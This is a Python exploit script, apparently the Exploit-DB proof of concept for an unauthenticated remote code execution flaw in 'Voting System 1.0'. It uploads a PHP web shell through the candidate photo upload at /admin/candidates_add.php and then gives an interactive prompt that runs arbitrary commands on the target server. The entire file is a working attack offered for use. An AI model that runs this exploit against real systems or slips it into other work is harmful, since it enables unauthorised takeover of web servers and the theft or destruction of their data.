import requests
import sys

def usage():
  print("Usage: python3 RCE_Voting_System.py [url]")
  print("Exemple: python3 RCE_Voting_System.py http://192.168.1.50/votesystem/")

def upload_web_shell(target):
  print("[+] Trying to upload a webshell...")
  file = {'photo': ('webshell.php','<?php system($_POST[\'cmd\']); ?>')}
  data = {'add':''}
  x = requests.post(target + '/admin/candidates_add.php', files=file, data=data)
  x2 = requests.get(target+ 'images/webshell.php')
  if(x2.status_code==200 & x.status_code == 200):
    print("Upload OK!")
  else:
    print("Upload failed! ")
    exit()

def generate_prompt(target):
    cmd = {'cmd':'whoami'}
    cmd2 = {'cmd':'hostname'}
    x = requests.post(target + '/images/webshell.php', data=cmd)
    x2 = requests.post(target + '/images/webshell.php', data=cmd2)
    prompt = x.text.rstrip('\n') + '@' + x2.text.rstrip('\n') + '$ '
    return prompt

def send_cmd(target, cmd):
    cmd = {'cmd':cmd}
    x = requests.post(target + '/images/webshell.php', data=cmd)
    return x.text

if(len(sys.argv)==1):
  usage()
  exit()

print("Voting System 1.0 - Remote Code Execution (Unauthenticated) - https://www.exploit-db.com/exploits/49846")

target_url=str(sys.argv[1])
upload_web_shell(target_url)
prompt = generate_prompt(target_url)
print("Web shell open. This is not a reverse shell")
cmd = ""

while(cmd!="exit"):
  try:
    cmd = input(prompt)
    if cmd != "":
      print(send_cmd(target_url, cmd))
  except KeyboardInterrupt:
    exit()
